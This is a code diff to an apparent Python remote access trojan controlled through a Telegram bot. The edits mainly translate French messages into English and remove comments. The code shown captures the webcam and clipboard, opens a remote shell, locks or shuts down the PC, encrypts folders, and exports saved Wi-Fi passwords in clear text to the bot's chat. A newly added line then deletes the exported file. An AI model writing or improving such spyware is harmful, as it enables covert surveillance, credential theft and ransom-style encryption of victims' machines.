@@ -22,7 +22,7 @@ bot.set_webhook()
 
 @bot.message_handler(commands=['start'])
 def start(message):
-    bot.send_message(message.chat.id, 'Welcome! Send /screen to capture screenshot.\n/sys to get system information.\/ip to get ip adress.\n/cd to navigate in folders. /ls for list élements. \n/upload [path] to get file.\n/crypt [path] for crypt folders files. /decrypt [path] \n/webcam /lock \n /clipboard /shell /wifi /speech [hi] \n/shutdown  ')
+    bot.send_message(message.chat.id, 'Welcome! Send /screen to capture screenshot.\n/sys to get system information.\n/ip to get ip adress.\n/cd to navigate in folders. \n/ls for list élements. \n/upload [path] to get file.\n/crypt [path] for crypt folders files. /decrypt [path] \n/webcam \n/lock \n /clipboard \n/shell \n/wifi \n/speech [hi] \n/shutdown  ')
 
 @bot.message_handler(commands=['screen'])
 def send_screen(message):
@@ -172,17 +172,15 @@ def decrypt_folder(message):
 @bot.message_handler(commands=['lock'])
 def lock_command(message):
     try:
- 
+
         result = subprocess.run(["rundll32.exe", "user32.dll,LockWorkStation"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
         
         if result.returncode == 0:
-            bot.send_message(message.chat.id, "La session Windows a été verrouillée.")
+            bot.send_message(message.chat.id, "windows session succefuly locked.")
         else:
-            bot.send_message(message.chat.id, "Impossible de verrouiller la session Windows.")
+            bot.send_message(message.chat.id, "Impossible to lock windows session.")
     except Exception as e:
-        bot.send_message(message.chat.id, f"Une erreur s'est produite : {str(e)}")
-
-
+        bot.send_message(message.chat.id, f"An error occurred : {str(e)}")
 
 shutdown_commands = [
     ['shutdown', '/s', '/t', '5'],
@@ -202,38 +200,37 @@ def shutdown_command(message):
                 break
         
         if success:
-            bot.send_message(message.chat.id, "Le PC s'éteindra dans 5 seconde.")
+            bot.send_message(message.chat.id, "shutdown in 5 seconds.")
         else:
-            bot.send_message(message.chat.id, "Impossible d'effectuer l'extinction.")
+            bot.send_message(message.chat.id, "Impossible to shutdown.")
     except Exception as e:
-        bot.send_message(message.chat.id, f"Une erreur s'est produite : {str(e)}")
+        bot.send_message(message.chat.id, f"An error occurred : {str(e)}")
 
 @bot.message_handler(commands=['webcam'])
 def capture_webcam_image(message):
     try:
-        # Initialize video capture from the webcam (0 indicates the default webcam)
+        
         cap = cv2.VideoCapture(0)
 
-        # Check if the webcam opened successfully
+    
         if not cap.isOpened():
             bot.send_message(message.chat.id, "Error: Unable to open the webcam.")
         else:
-            # Capture an image from the webcam
+            
             ret, frame = cap.read()
 
             if ret:
-                # Save the captured image as an image file (e.g., capture.jpg)
+                
                 cv2.imwrite("webcam.jpg", frame)
 
-                # Send the captured image to the Telegram chat
+              
                 with open("webcam.jpg", 'rb') as photo_file:
                     bot.send_photo(message.chat.id, photo=photo_file)
                 
-                os.remove("webcam.jpg")  # Remove the image after sending
+                os.remove("webcam.jpg")  
             else:
                 bot.send_message(message.chat.id, "Error while capturing the image.")
 
-        # Release video capture
         cap.release()
 
     except Exception as e:
@@ -243,33 +240,32 @@ def capture_webcam_image(message):
 @bot.message_handler(commands=['speech'])
 def text_to_speech_command(message):
     try:
-     
+       
         text = message.text.replace('/speech', '').strip()
         
         if text:
-        
+           
             pyttsx3.speak(text)
-            bot.send_message(message.chat.id, "Texte converti en discours et lu avec succès.")
+            bot.send_message(message.chat.id, "succesful say.")
         else:
-            bot.send_message(message.chat.id, "Utilisation incorrecte de la commande. Utilisez /speech [TEXTE]")
+            bot.send_message(message.chat.id, "Use like this. Utilisez /speech [TEXTE]")
     except Exception as e:
-        bot.send_message(message.chat.id, f"Une erreur s'est produite : {str(e)}")
+        bot.send_message(message.chat.id, f"An error occurred : {str(e)}")
 
 
 @bot.message_handler(commands=['clipboard'])
 def clipboard_command(message):
     try:
-       
+      
         clipboard_text = clipboard.paste()
 
         if clipboard_text:
           
-            bot.send_message(message.chat.id, f"Contenu du presse-papiers :\n{clipboard_text}")
+            bot.send_message(message.chat.id, f"Clipboard content :\n{clipboard_text}")
         else:
-            bot.send_message(message.chat.id, "Le presse-papiers est vide.")
+            bot.send_message(message.chat.id, "clipboard is empty.")
     except Exception as e:
-        bot.send_message(message.chat.id, f"Une erreur s'est produite : {str(e)}")
-
+        bot.send_message(message.chat.id, f"An error occurred : {str(e)}")
 
 
 user_states = {}
@@ -333,7 +329,7 @@ def handle_shell_commands(message):
 
 
 def send_long_message(user_id, message_text):
-    part_size = 4000 
+    part_size = 4000  
     message_parts = [message_text[i:i+part_size] for i in range(0, len(message_text), part_size)]
 
     for part in message_parts:
@@ -346,11 +342,11 @@ def get_wifi_passwords(message):
         
         subprocess.run(['netsh', 'wlan', 'export', 'profile', 'key=clear'], shell=True, text=True)
 
-
+        
         with open('Wi-Fi-App.xml', 'r') as file:
             xml_content = file.read()
 
-    
+      
         ssid_match = re.search(r'<name>(.*?)<\/name>', xml_content)
         password_match = re.search(r'<keyMaterial>(.*?)<\/keyMaterial>', xml_content)
 
@@ -358,14 +354,17 @@ def get_wifi_passwords(message):
             ssid = ssid_match.group(1)
             password = password_match.group(1)
 
-          
             message_text = f"SSID: {ssid}\nPASS: {password}"
             bot.send_message(message.chat.id, message_text)
+            try:
+                os.remove("Wi-Fi-App.xml")
+            except:
+                pass
         else:
             bot.send_message(message.chat.id, "NOT FOUND.")
 
     except Exception as e:
-        bot.send_message(message.chat.id, f"Une erreur s'est produite : {str(e)}")
+        bot.send_message(message.chat.id, f"An error occurred : {str(e)}")
 
 
 try:
